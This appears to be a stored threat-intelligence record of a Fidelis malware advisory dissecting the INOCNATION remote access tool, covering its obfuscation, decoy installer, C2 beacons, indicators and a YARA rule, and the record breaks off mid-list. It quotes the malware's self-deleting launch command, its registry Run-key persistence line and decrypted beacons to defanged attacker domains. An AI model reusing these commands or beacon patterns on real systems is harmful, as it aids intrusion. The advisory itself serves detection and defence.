{
    "id": "6bd5c8c9-dea7-4c28-ba04-c1bd304fa9e8",
    "created_at": "2022-10-25T16:48:19.951511Z",
    "updated_at": "2025-03-27T02:13:04.357286Z",
    "deleted_at": null,
    "sha1_hash": "828829fcd1522aad45649b2c71a1d9050638f11f",
    "title": "",
    "authors": "",
    "file_creation_date": "2015-12-16T15:36:57Z",
    "file_modification_date": "2015-12-16T15:36:58Z",
    "file_size": 1621375,
    "plain_text": "### Fidelis Threat Advisory #1020\n# Dissecting the Malware Involved in the INOCNATION Campaign\n\n[As the findings of a new malware attack campaign named INOCNATION emerged, Fidelis Threat Research investigated the Remote Access Tool](http://www.crowdstrike.com/blog/sakula-reloaded/)\n(RAT) used in this campaign. We discovered some interesting characteristics. This particular RAT employs simple and cunning techniques to\nprevent its discovery or further investigation. The embedded anti-analysis techniques and other capabilities introduce tradecraft that is integrated\ndirectly into the malware’s layers. Specifically we found that the malware utilized the following techniques:\n\nf Different types of XOR techniques to obfuscate components and its contained stringsf\n\nf The use of trusted security software as a decoy during initial infectionf\n\nf Sandbox detectionf\n\nf A mangled MZ header to deceive security productsf\n\nf String Stacking obfuscation with Unicode Stringsf\n\nf More than one layer of obfuscation for its command and control trafficf\n\nf Un-Install functionalityf\n\n**MD5 Hash** **Function** **Description**\n\nA7BD555866AE1C161F78630A638850E7 Initial Launcher/Dropper Executable (EXE)\n\nDecoy Installer for Cisco AnyConnect\n2F7E5F91BE1F5BE2B2F4FDA0910A4C16 Executable (EXE)\n\nMobility Client\n\n4F4BF27B738FF8F2A89D1BC487B054A8 RAT Installer Executable (EXE)\n\n75D3D1F23628122A64A2F1B7EF33F5CF RAT Implant/Payload OLE Control Library (DLL)\n\n68F1419721354EC1f78A71E10B54FCA8 Cisco AnyConnect Mobility Client Valid Signed Executable (EXE)\n\n## Initial Launcher/Dropper\n\n### MD5 Hash: A7BD555866AE1C161F78630A638850E7\n\nThe initial launcher/dropper writes two executable files to the hard drive, the RAT Installer (MD5: 4F4BF27B738FF8F2A89D1BC487B054A8) and\nthe Cisco AnyConnect decoy (MD5: 2F7E5F91BE1F5BE2B2F4FDA0910A4C16). This launcher is also responsible for the initial execution of both the\nmalware and decoy processes. Both embedded executable files are obfuscated with an XOR operation using a single-byte hexadecimal key of\n0x62, but both the XOR byte and the Null byte (0x00) is skipped. By skipping over the XOR bytes and Null bytes this helps the malware to protect\nitself from static analysis tools by preventing an accurate extraction. The only difference between the two de-obfuscation routines is how many\nbytes are XOR’ed at a time during each round. The RAT Installer is XOR’ed six bytes at a time and the Cisco decoy is XOR’ed four bytes at a time.\nThis additional code suggests that the malware author may change in the future from a repeated single-byte XOR key to a non-repeated multibyte XOR key to better protect any future embedded malware.\n\n|MD5 Hash|Function|Description|\n|---|---|---|\n|A7BD555866AE1C161F78630A638850E7|Initial Launcher/Dropper|Executable (EXE)|\n|2F7E5F91BE1F5BE2B2F4FDA0910A4C16|Decoy Installer for Cisco AnyConnect Mobility Client|Executable (EXE)|\n|4F4BF27B738FF8F2A89D1BC487B054A8|RAT Installer|Executable (EXE)|\n|75D3D1F23628122A64A2F1B7EF33F5CF|RAT Implant/Payload|OLE Control Library (DLL)|\n|68F1419721354EC1f78A71E10B54FCA8|Cisco AnyConnect Mobility Client|Valid Signed Executable (EXE)|\n\n\n-----\n\nFigure 2 - Four-byte XOR Routine (Decoy Decode)\n\nFigure 1 - Six-byte XOR Routine (Malware Decode)\n\n## Decoy Installer for Cisco AnyConnect Mobility Client\n\n### (MD5: 2F7E5F91BE1F5BE2B2F4FDA0910A4C16)\n\n\n-----\n\nAfter being initiated by the initial launcher the legitimate looking decoy Cisco Installer process executes and becomes visible to the victim. The\ntarget victim may choose to continue or cancel the installation, but despite a victim’s decision to cancel the installation the malware infection\ncontinues under a separate running process. It silently begins to create and entrench the loaded malware into the system’s background. If the\nvictim chooses to continue with the Cisco installation the Cisco AnyConnect Mobility Client software is actually installed, as shown in Figures\n4 and 5.\n\nFigure 4 - Installed Files from the Cisco AnyConnect Software Install\n\nFigure 5 - Execution of Cisco binary vpnui.exe (MD5: 68F1419721354EC1f78A71E10B54FCA8)\n\nThe attacker’s use of decoy software is the same as when a threat actor will decide to display a decoy PFD or Office Document, to give the\nvictim a sense that everything is fine and that there is no need to inform the IT or the Security team for investigation. But the decision by the\nattacker to use a widely known security application as an embedded decoy is a slightly more sophisticated ploy to the average user or to a less\nexperienced systems administrator.\n\n\n-----\n\nFigure 6 - Signature Verified by VirusTotal\n\nThe Cisco AnyConnect, “vpnui.exe”, appears to be a legitimate application signed by Cisco with the following digital signature details:\n\n**Name of signer:** Cisco Systems, Inc.\n**Signing time:** Friday, July 24, 2015\n**Certificate serial #:** 63 6c 75 43 dd bd f9 69 f4 73 16 0f 4b 09 9b 9e\n\nBy choosing common VPN software there is a high chance that the chosen vendor’s software may be in use within the intended victim’s corporate\nenvironment. Some investigation by the victim into the legitimacy of the software title, like in Figure 6, is intended to give a sense that it was\nthe right thing in installing this security software. Also, users are bombarded by various software applications to apply security patches or by IT\ndepartments to install new software for upgrades and increased security. Most security software runs in the background so it may be that users\nhave become more willing to run security software because they know they need it despite that they don’t know what it actually does or how\nit is supposed to work, just that it is supposed to protect them.\n\nThe use of this Cisco application could also reveal that the intended targets of this attack may be a system administrator holding higher-level\nprivileged access credentials to multiple areas of the network enterprise and infrastructure. If this malware were to be copied amongst other\ncopies of an administrator’s software library, the system administrator may later confuse this malware for other legitimate Cisco software, thus\ninfecting him and/or another user to whom the software was forwarded.\n\nPlease note that this is not a vulnerability or exploit within the Cisco product, but a decision by the attacker to use a Cisco application as a decoy.\n[Other attacks have been reported to use similar security software lures, such as Juniper Networks and Microsoft Exchange.](http://blog.airbuscybersecurity.com/post/2015/10/Malware-Sakula-Evolutions-%28Part-2/2%29)\n\n## RAT Installer\n\n### (MD5: 4F4BF27B738FF8F2A89D1BC487B054A8)\n\nDuring reverse engineering of the RAT Installer we observed that the file implemented an anti-behavioral analysis technique. This technique\ncompared the mouse/cursor pointer’s screen position coordinates at two different points in time (5000 milliseconds). The author is using routine\nto detect whether the malware has been executed without a user being present, which is typically done during sandbox analysis. This technique\nwill defeat less sophisticated sandboxes that do not implement simulation actions, such as mouse movement or mouse clicks during runtime\nanalysis.\n\n\n-----\n\nFigure 7 - Simple Sandbox Detection Check via Mouse Movement\n\nThe RAT Installer contains an obfuscated malicious DLL payload, which it rebuilds and installs. The embedded file (MD5:\n75D3D1F23628122A64A2F1B7EF33F5CF), later written to disk as adobe.dat, is obfuscated with a double XOR loop with keys 0x2C and\n0x7B (this is mathematically equivalent to a single XOR loop with the byte key 0x57). Once this DLL is de-obfuscated, we observed another\ncommon anti-behavioral analysis technique used to try and extend the longevity of the loaded payload’s usage. The malware is\nmissing an appropriate MZ header. The first two hexadecimal bytes of the payload data are 0x9B 0x8A, but they should start with\n0x4D 0x5A, the bytes for the ASCII characters “MZ”. This is a method attackers can use to confuse virus detection engines looking for\nmalicious code as an effort to detect or disinfect the data in memory. Virus detection engines generally hook API calls in User mode\nor Kernel mode that are used for file input/output, such as the WriteFile API call. If an intact executable is found within the memory\nbuffer the binary is sent off for behavioral analysis by the detection engine. In order to prevent detonation on hosts other than that\nof the intended victim, the malware author has purposely mangled the first two bytes of the RAT Implant. After writing the payload\nimplant code the first two bytes of the file are corrected from 0x9B 0x8A to 0x4D 0x5A and the malware is entrenched into the system.\n\nFigure 8 – Two WriteFile API calls. The First to Write the Payload File and Then the Second to Correct the First to Bytes to MZ.\n\n\n-----\n\nFigure 9 - Registry Entrenchment Entry\n\nThe RAT Installer also sets the entrenchment/persistence mechanism for the payload malware. While this is a trivial persistence method, the\nmalware Payload DLL has the ability to reference this registry key during the un-install routine, which will be described later.\n\nFinally, just before exit the RAT Installer lauches a new process with a similar argument string to, “cmd /c ping 127.0.0.1&del “%TEMP%\\\nCenter111940519.exe”&regsvr32 /s “%AppData%\\adobe\\adobe.dat””. Within this command several things are happening:\n\n1. A ping to local host acts as a command to sleep for four seconds\n2. Delete itself, the RAT Installer file, Center111940519.exe\n3. Execute the Implant DLL Payload file\n\n## RAT Implant/Payload\n\n### (MD5: 75D3D1F23628122A64A2F1B7EF33F5CF)\n\nFigure 10 - Unicode String Stacking then XOR deobfuscation of the User-Agent String\n\n\n-----\n\nAnalysis of the malicious payload DLL reveals that the malware was using a string stacking technique that moves four bytes of a Unicode string at\na time into memory. This technique is used as needed throughout the binary and each time with different XOR key bytes. For example, the string at\nthe relative virtual address (RVA) 0x10001630 is loaded and then XOR’d with key 0x0d to reveal the following User-agent string in Unicode format:\n\n_Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0;rv:11.0) like Gecko_\n\nSimilar activity also occurs at RVA 0x10000179F where the string is XOR’d with key 0x14 to reveal the following static string observed in the\nbeacon to the C2:\n\n1a53b0cp32e46g0qio9\n\nThe code for that procedure is below:\n\nWhile this string stacking technique is very common within shellcode, it is less frequently used with Unicode strings because Unicode strings are\ntwo bytes in length for every character, as compared to one-byte length for ASCII characters. This technique doubles the amount of data needed\nfor the string. Other malware families such as Ixeshe/Etumbot, which are known to be used by Numbered Panda, also utilize this technique.\nThe string stacking technique is used to make analysis more difficult so that the strings cannot be easily discovered by malware analysis tools\nsuch as XORSearch.\n\nAgain, the less-interesting Double XOR routine appears to be used to obfuscate the C2 domain with the single-byte keys 0x70 and 0x79. In this\ncase the Double XOR with 0x70 and 0x79 is mathematically equivalent to a Single XOR operation using 0x09. While the Double XOR is a trivial\ntechnique, it is the sum of the routines and keys used in malware that can end up leading to attribution. The obfuscated string is:\n\n10006148 60 09 67 09 66 09 6A 09 67 09 68 09 7D 09 60 09 `.g.f.j.g.h.}.`.\n10006158 66 09 67 09 27 09 6A 09 66 09 64 09       f.g.’.j.f.d.\n\n\n-----\n\nBelow is a table that shows the mathematical logic in how the above is decoded into the actual C2 domain:\n\n|Obfuscated String|1st XOR Key|Result|2nd XOR Key|C2 Hex|C2 ASCII|\n|---|---|---|---|---|---|\n|60||10||69|i|\n|09||79||00||\n|67||17||6E|n|\n|09||79||00||\n|66||16||6F|o|\n|09||79||00||\n|6A||1A||63|c|\n|09||79||00||\n|67||17||6E|n|\n|09||79||00||\n|68||18||61|a|\n|09||79||00||\n|7D|0x70|0D|0x79|74|t|\n|09||79||00||\n|60||70||69|i|\n|09||79||00||\n|66||16||6F|o|\n|09||79||00||\n|67||17||6E|n|\n|09||79||00||\n|27||57||2E|.|\n|09||79||00||\n|6A||1A||63|c|\n|09||79||00||\n|66||16||6F|o|\n|09||79||00||\n|64||14||6D|m|\n|09||79||00||\n\n\n-----\n\nAnd this is the portion of the code responsible for this process:\n\nFigure 11 - Assembly Code Instructions for the Double XOR Routine\n\nNext, the malware implant uses more than one layer to obfuscate its network Command and Control (C2) communications. The outer layer is\nan encrypted HTTPS via an SSL/TLS connection using the Windows’ standard SSL/TLS libraries. A SSL/TLS connection is used as an effort to\nprevent others in the open Internet from seeing the contents of a communication.\n\nFigure 12 - Malware Sets the Flag WINHTTP_FLAG_SECURE Requesting An SSL/TLS Connection Out\n\nCommercial enterprises will generally purchase SSL Inspection hardware that essentially perform a Man-In-The-Middle technique on all SSL/\nTLS traffic that passes through it, allowing the entity to have visibility and inspection of network traffic that would otherwise be non-visible.\n\nDuring analysis we noticed that within the decrypted SSL/TLS communication the commands to/from the C2 are encoded with a single-byte\nXOR. An additional layer used to thwart detection and analysis efforts. For targets in which a victim is seated in an organization that has an SSL\nInspection device, the malware takes this additional step to further hide its network activity. The malware uses the single-byte XOR key 0x5C\nto send the victim’s data back to the C2, and in the C2 response back to the malware the command arguments received are obfuscated with a\ndifferent key of 0x2E.\n\nCompletely decrypted and de-obfuscated network traffic from this malware will look like the following (replace COMPUTER_NAME with actual\nname of computer, host header remove brackets):\n\n_POST /-1289335108[COMPUTER_NAME].1a53b0cp32e46g0qio9 HTTP/1.1_\n_User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko_\n_Host: inocnation[.]com_\n_Content-Length: 8_\n_Connection: Keep-Alive_\n\n\n-----\n\nIn the above POST request, the string “1a53b0cp32e46g0qio9” is staticly embedded within the binary, not changing between C2 beacons, and\nthe negative value “-1289335108” refers to the signed integer representation of the Victim’s Volume Serial Number without the dash (“-“). Figure\n13 shows this representation for a Victim system using the Volume Serial Number: “B326-4EBC”.\n\nFigure 13 - Hexidecimal to Signed Integer Conversion\n\nThe DLL can accept the following list of commands from its C2:\n\n**Binary Command** **Description**\n\n0x10 Process Execution\n\n0x90 Reverse Shell\n\n0x02 File Activity (delete file, directory browsing, etc.)\n\n0x60\n\nUpload File to Victim System\n\n0xA0\n\n0x04 Download File From Victim System\n\n0x70 Get System Information\n\n0x80 Uninstall Malware\n\nThe Uninstall command was the most interesting, suggesting that the actor controlling this malware would like to keep a limited number of\nvictims by removing this tool when commanded.\n\n## THE FIDELIS TAKE\n\nThe techniques documented in this report indicate a level of sophistication that make reverse engineering more difficult and to obscure the\nintentions of the actor behind this malware. Using Cisco AnyConnect software as a lure continues a pattern of using typical corporate software\nas a vehicle to infect victim machines.\n\nThe use of multiple XOR keys and string stacking show the actor is spending great effort to deceive reverse engineers and incident responders.\nThe use of both SSL/TLS and encoded communications show the knowledge many enterprises perform SSL man-in-the-middle decryption of\ntraffic and this provides a layer to hide communications from incident responders. This paper highlights many of these techniques and how\nwe were able to bypass them.\n\nFidelis Cybersecurity’s products detect the activity documented in this paper and additional technical indicators are published in the appendices\n[of this paper and to the Fidelis Cybersecurity github at https://github.com/fideliscyber.](https://github.com/fideliscyber)\n\n**We want to thank our fellow security researchers at CrowdStrike for sharing hashes of the malware samples analyzed in this report.**\n\n|Binary Command|Description|\n|---|---|\n|0x10|Process Execution|\n|0x90|Reverse Shell|\n|0x02|File Activity (delete file, directory browsing, etc.)|\n|0x60 0xA0|Upload File to Victim System|\n|0x04|Download File From Victim System|\n|0x70|Get System Information|\n|0x80|Uninstall Malware|\n\n\n-----\n\n## Appendix A: Summary of Informal Triage Analysis On Discovered Payload Files\n\n**MD5 Hash** **Function** **Description**\n75D3D1F23628122A64A2F1B7EF33F5CF RAT Implant/Payload OLE Control Library (DLL)\n\nD9821468315CCD3B9EA03161566EF18E RAT Implant/Payload OLE Control Library (DLL)\n\nB9AF5F5FD434A65D7AA1B55F5441C90A RAT Implant/Payload OLE Control Library (DLL)\n\nThe first two DLLs beacon to inocnation[dot]com. The malware for this analysis was compiled between April - August 2015 and the DLLs exhibited\na very low detection rate on VirusTotal.\n\n**Analysis of the file with MD5 Hash: 75D3D1F23628122A64A2F1B7EF33F5CF**\n\nIn our lab, this file is written as %APPDATA%\\adobe\\adobe.bat. It is an OLE Control DLL exporting the basic functions named DllRegisterServer\nand DllUnregisterServer. This file is dropped by the executable file with MD5 hash: 4F4BF27B738FF8F2A89D1BC487B054A8.\n\n**File Metadata**\nFile Name: adobe.dat\nFile Size: 22016 bytes\nMD5: 75d3d1f23628122a64a2f1b7ef33f5cf\nSHA1: 3d7b789e3a630c0bd9db0b3217f72348025b845c\nPE Time: 0x55372A7A [Wed Apr 22 04:58:34 2015 UTC]\nPEID Sig: Microsoft Visual C++ v6.0 DLL\nSections (4):\nName Entropy MD5\n.text 6.46 5c3d9bac10a06111e2bb1356bce6140a\n.rdata 4.62 69fc21366b719cab74f899fb18a8c26f\n.data 0.0 bf619eac0cdf3f68d496ea9344137e8b\n.reloc s4.28 4e2b7dd08fa32594616a1d463e9b0975\n\nEntrenchment mechanism for persistence into the system:\n\nKey: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue name: AdobePlayer\nValue data: regsvr32 /s “C:\\Documents and Settings\\[USER_NAME]\\Application Data\\adobe\\adobe.dat”\n\n**Analysis of the file with MD5 Hash: D9821468315CCD3B9EA03161566EF18E**\n\nThis DLL payload is the same malware family, contains the same inocnation[dot]com C2 configuration as the one dropped by the file with the\nMD5 Hash: 4F4BF27B738FF8F2A89D1BC487B054A8, but looks to be compiled via a slightly different source.\n\n**File Metadata**\nFile Name: d9821468315ccd3b9ea03161566ef18e.dll\nFile Size: 28672 bytes\nMD5: d9821468315ccd3b9ea03161566ef18e\nSHA1: b9308a65383681b862e16e4c042dbf7a61cce716\nPE Time: 0x55ECEE49 [Mon Sep 07 01:54:17 2015 UTC]\nPEID Sig: Microsoft Visual C++ v6.0 DLL\nSections (5):\nName Entropy MD5\n.text 6.48 ee6cde0fdae9bfa6c18b3783a23d0952\n.rdata 4.77 886f6f3780467a511ae909d20390df5b\n.data 1.16 54d7948676ee96b2f9e0a141598b564d\n.rsrc 5.55 e5665b3b3ffbbfcd5f2cbf31677fcbf9\n.reloc 4.64 c1cea8dced657cfc85b045a2421417f1\n\n|MD5 Hash|Function|Description|\n|---|---|---|\n|75D3D1F23628122A64A2F1B7EF33F5CF|RAT Implant/Payload|OLE Control Library (DLL)|\n|D9821468315CCD3B9EA03161566EF18E|RAT Implant/Payload|OLE Control Library (DLL)|\n|B9AF5F5FD434A65D7AA1B55F5441C90A|RAT Implant/Payload|OLE Control Library (DLL)|\n\n\n-----\n\nWhen this malicious DLL is executed by calling it with its “DllRegisterServer” function, the Victim system establishes a secure and encrypted\nconnection on port 443 and beacons with the following request (encryption layer removed).\n\n_POST /-1289335108[COMPUTER_NAME].1a53b0cp32e46g0qio7 HTTP/1.1_\n_User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko_\n_Host: inocnation[dot]com_\n_Content-Length: 8_\n_Connection: Keep-Alive_\n\n**Analysis of the file with MD5 Hash: B9AF5F5FD434A65D7AA1B55F5441C90A**\n\nThis is a malicious DLL that belongs to the same malware family as the one dropped by “4f4bf27b738ff8f2a89d1bc487b054a8”, and is almost\nbyte-by-byte exactly similar except for the fact that it beacons to a different C2 domain mail.cbppnews[dot]com. This DLL also contains the\nbasic export functions of DllRegisterServer and DllUnregisterServer. The main difference with the other malware is the C2 server.\n\n**File Metadata**\nFile Name: b9af5f5fd434a65d7aa1b55f5441c90a.dll\nFile Size: 22016 bytes\nMD5:    b9af5f5fd434a65d7aa1b55f5441c90a\nSHA1:    9b1e902103f7e23d915f4d01c84779e0bdca6995\nPE Time:  0x55372A7A [Wed Apr 22 04:58:34 2015 UTC]\nPEID Sig:  Microsoft Visual C++ v6.0 DLL\nSections (4):\nName   Entropy MD5\n.text   6.46   5c3d9bac10a06111e2bb1356bce6140a\n.rdata  4.64   76ae6bd3bce3f1fb9a86b9faac9b42be\n.data   0.0   bf619eac0cdf3f68d496ea9344137e8b\n.reloc  4.28   4e2b7dd08fa32594616a1d463e9b0975\n\nWhen this malicious DLL is executed the Victim system establishes a secure and encrypted connection on port 443 and beacons with the\nfollowing request (encryption layer removed).\n\n_POST /-1289335108[COMPUTER_NAME].1a53b0cp32e46g0qio9 HTTP/1.1_\n_User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko_\n_Host: mail.cbppnews[dot]com_\n_Content-Length: 8_\n_Connection: Keep-Alive_\n\nThe following string represents the obfuscated format of the Command & Control (C2) domain:\n\n00B9FD24 25 48 29 48 21 48 24 48 66 48 2B 48 2A 48 38 48 %H)H!H$HfH+H*H8H\n00B9FD34 38 48 26 48 2D 48 3F 48 3B 48 66 48 2B 48 27 48 8H&H-H?H;HfH+H’H\n00B9FD44 25 48\n\nThe C2 domain is de-obfuscated using the same code observed in the analysis of the “75D3D1F23628122A64A2F1B7EF33F5CF” (malicious DLL\npayload dropped into the system), but in this case the XOR keys used are different from the sample previously analyzed. The XOR keys used are\n0x39 and 0x71.\n\n\n-----\n\n## Appendix B: File Summary and Technical Indicators\n\n**MD5** **File name**\n\na7bd555866ae1c161f78630a638850e7 Win-Release-web-deploy.\n\nexe\n\n5cb6e6e0fbe87eba975b5ae0efaf2ca4 Center14430654.dat / any­\n\nconnect-win-4.1.04011\nweb-deploy-k9.exe\n\n4f4bf27b738ff8f2a89d1bc487b054a8 Center111940519.dat\n\n75d3d1f23628122a64a2f1b7ef33f5cf adobe.dat\n\nd9821468315ccd3b9ea03161566ef18e ‘unknown’\n\nb9af5f5fd434a65d7aa1b55f5441c90a adobe.dat\n\n## Indicator List:\n**File Entrenchment Paths:**\n%TEMP%\\Center1[Decimal_Result_of_GetTickCount].dat\n%TEMP%\\Center[Decimal_Result_of_GetTickCount].dat\n%AppData%\\adobe\\adobe.dat\n\n**Persistence Location:**\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\nAdobePlayer=”regsvr32 /s %AppData%\\malware\\adobe\\adobe.dat”\n\n**Memory Artifacts:**\ninocnation[dot]com\nmail.cbppnews[dot]com\n1a53b0cp32e46g0qio9\n\n**Hashes:**\nA7BD555866AE1C161F78630A638850E7\n4F4BF27B738FF8F2A89D1BC487B054A8\n75D3D1F23628122A64A2F1B7EF33F5CF\nD9821468315CCD3B9EA03161566EF18E\nB9AF5F5FD434A65D7AA1B55F5441C90A\n\n**DNS:**\ninocnation[dot]com\nmail.cbppnews[dot]com\n\n**Resolved IPs:**\n211.104.106[.]41 (inocnation from August to October, 2015)\n87.198.23[.]40 (inocnation, current)\n202.172.32[.]160 (cbppnews, current)\n\n|MD5|File name|AV Hits|Common Risk Name|Notes|Compile Date|\n|---|---|---|---|---|---|\n|a7bd555866ae1c161f78630a638850e7|Win-Release-web-deploy. exe|17|Trojan.CryptRedol|Launcher/ Dropper|Thu Aug 06 05:34:53 2015|\n|5cb6e6e0fbe87eba975b5ae0efaf2ca4|Center14430654.dat / any­ connect-win-4.1.04011- web-deploy-k9.exe|0|None|Legit Cisco AnyConnect Mobility Cli­ ent installer|Mon Mar 01 10:28:24 2010|\n|4f4bf27b738ff8f2a89d1bc487b054a8|Center111940519.dat|12|Trojan.CryptRedol. Gen.3|Malware installer|Thu Aug 06 04:47:17 2015|\n|75d3d1f23628122a64a2f1b7ef33f5cf|adobe.dat|4|Trojan-FH­ DR!75D3D1F23628|Malicious DLL|Wed Apr 22 04:58:34 2015|\n|d9821468315ccd3b9ea03161566ef18e|‘unknown’|4|Trojan.FHDR!tr|Malicious DLL|Mon Sep 07 01:54:17 2015|\n|b9af5f5fd434a65d7aa1b55f5441c90a|adobe.dat|5|Trojan-FHDR! Backdoor.HIXOR.A Trojan.A!tr|Malicious DLL|Wed Apr 22 04:58:34 2015|\n\n\n-----\n\n**YARA:**\nrule apt_win32_dll_rat_1a53b0cp32e46g0qio7\n{\nmeta:\nhash1 = “75d3d1f23628122a64a2f1b7ef33f5cf”\nhash2 = “d9821468315ccd3b9ea03161566ef18e”\nhash3 = “b9af5f5fd434a65d7aa1b55f5441c90a”\nstrings:\n// Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0;rv:11.0) like Gecko\n$ = { c7 [2] 64 00 63 00 c7 [2] 69 00 62 00 c7 [2] 7a 00 7e 00 c7 [2] 2d 00 43 00 c7 [2] 59\n00 2d 00 c7 [2] 3b 00 23 00 c7 [2] 3e 00 36 00 c7 [2] 2d 00 5a 00 c7 [2] 42 00 5a 00 c7 [2] 3b 00\n39 00 c7 [2] 36 00 2d 00 c7 [2] 59 00 7f 00 c7 [2] 64 00 69 00 c7 [2] 68 00 63 00 c7 [2] 79 00 22\n00 c7 [2] 3a 00 23 00 c7 [2] 3d 00 36 00 c7 [2] 2d 00 7f 00 c7 [2] 7b 00 37 00 c7 [2] 3c 00 3c 00\nc7 [2] 23 00 3d 00 c7 [2] 24 00 2d 00 c7 [2] 61 00 64 00 c7 [2] 66 00 68 00 c7 [2] 2d 00 4a 00 c7\n\n[2] 68 00 6e 00 c7 [2] 66 00 62 00 } // offset 10001566\n// Software\\Microsoft\\Windows\\CurrentVersion\\Run\n$ = { c7 [2] 23 00 24 00 c7 [2] 24 00 33 00 c7 [2] 38 00 22 00 c7 [2] 00 00 33 00 c7 [2] 24\n00 25 00 c7 [2] 3f 00 39 00 c7 [2] 38 00 0a 00 c7 [2] 04 00 23 00 c7 [2] 38 00 00 00 c7 [2] 43 00\n66 00 c7 [2] 6d 00 60 00 c7 [2] 67 00 52 00 c7 [2] 6e 00 63 00 c7 [2] 7b 00 67 00 c7 [2] 70 00 00\n00 c7 [2] 43 00 4d 00 c7 [2] 44 00 00 00 c7 [2] 0f 00 43 00 c7 [2] 00 00 50 00 c7 [2] 49 00 4e 00\nc7 [2] 47 00 00 00 c7 [2] 11 00 12 00 c7 [2] 17 00 0e 00 c7 [2] 10 00 0e 00 c7 [2] 10 00 0e 00 c7\n\n[2] 11 00 06 00 c7 [2] 44 00 45 00 c7 [2] 4c 00 00 00 } // 10003D09\n$ = { 66 [4-7] 0d 40 83 f8 44 7c ?? }\n// xor word ptr [ebp+eax*2+var_5C], 14h\n// inc eax\n// cmp eax, 14h\n// Loop to decode a static string. It reveals the “1a53b0cp32e46g0qio9” static string sent\nin the beacon\n\n$ = { 66 [4-7] 14 40 83 f8 14 7c ?? } // 100017F0\n$ = { 66 [4-7] 56 40 83 f8 2d 7c ?? } // 10003621\n$ = { 66 [4-7] 20 40 83 f8 1a 7c ?? } // 10003640\n$ = { 80 [2-7] 2e 40 3d 50 02 00 00 72 ?? } // 10003930\n$ = “%08x%08x%08x%08x” wide ascii\n$ = “WinHttpGetIEProxyConfigForCurrentUser” wide ascii\n\ncondition:\n(uint16(0) == 0x5A4D or uint32(0) == 0x4464c457f) and (all of them)\n\n}\n\nUsers are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use. This\ndocument cannot be modified or converted to any other electronic or machine-readable form in whole or in part without prior written approval\nof Fidelis Cybersecurity, Inc. While we have done our best to ensure that the material found in this document is accurate, Fidelis Cybersecurity,\nInc. makes no guarantee that the information contained herein is error free.\n\n**CONTACT US TODAY TO LEARN MORE ABOUT FIDELIS**\n**Fidelis Cybersecurity | 800 652 4020 | info@fidelissecurity com**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://www.fidelissecurity.com/sites/default/files/FTA_1020_Fidelis_Inocnation_FINAL_0.pdf"
    ],
    "report_names": [
        "FTA_1020_Fidelis_Inocnation_FINAL_0.pdf"
    ],
    "threat_actors": [
        {
            "id": "d18fe42c-8407-4f96-aee0-a04e6dce219a",
            "created_at": "2023-01-06T13:46:38.275292Z",
            "updated_at": "2025-03-27T02:00:02.79092Z",
            "deleted_at": null,
            "main_name": "APT12",
            "aliases": [
                "Calc Team",
                "IXESHE",
                "BRONZE GLOBE",
                "BeeBus",
                "DynCalc",
                "DNSCalc",
                "Crimson Iron",
                "NUMBERED PANDA",
                "TG-2754",
                "Group 22"
            ],
            "source_name": "MISPGALAXY:APT12",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6a660ea2-1118-404a-9f8f-f0d6a1e9f184",
            "created_at": "2022-10-25T15:50:23.685924Z",
            "updated_at": "2025-03-27T02:00:55.52357Z",
            "deleted_at": null,
            "main_name": "APT12",
            "aliases": [
                "APT12",
                "IXESHE",
                "DynCalc",
                "Numbered Panda",
                "DNSCALC"
            ],
            "source_name": "MITRE:APT12",
            "tools": [
                "Ixeshe",
                "RIPTIDE",
                "HTRAN"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2f07a03f-eb1f-47c8-a8e9-a1a00f2ec253",
            "created_at": "2022-10-25T16:07:24.277669Z",
            "updated_at": "2025-03-27T02:02:10.157972Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Operation LagTime IT",
                "Operation StealthyTrident",
                "ThunderCats"
            ],
            "source_name": "ETDA:TA428",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Albaniiutas",
                "BlueTraveller",
                "Chymine",
                "Cotx RAT",
                "CoughingDown",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "LuckyBack",
                "PhantomNet",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SManager",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TManger",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c5f79f58-db78-4cd7-88cf-c029a2199360",
            "created_at": "2022-10-25T16:07:23.325227Z",
            "updated_at": "2025-03-27T02:02:09.738383Z",
            "deleted_at": null,
            "main_name": "APT 12",
            "aliases": [
                "APT 12",
                "BeeBus",
                "Bronze Globe",
                "CTG-8223",
                "Calc Team",
                "Crimson Iron",
                "DNSCalc",
                "DynCALC",
                "Group 22",
                "Numbered Panda"
            ],
            "source_name": "ETDA:APT 12",
            "tools": [
                "AUMLIB",
                "ETUMBOT",
                "Exploz",
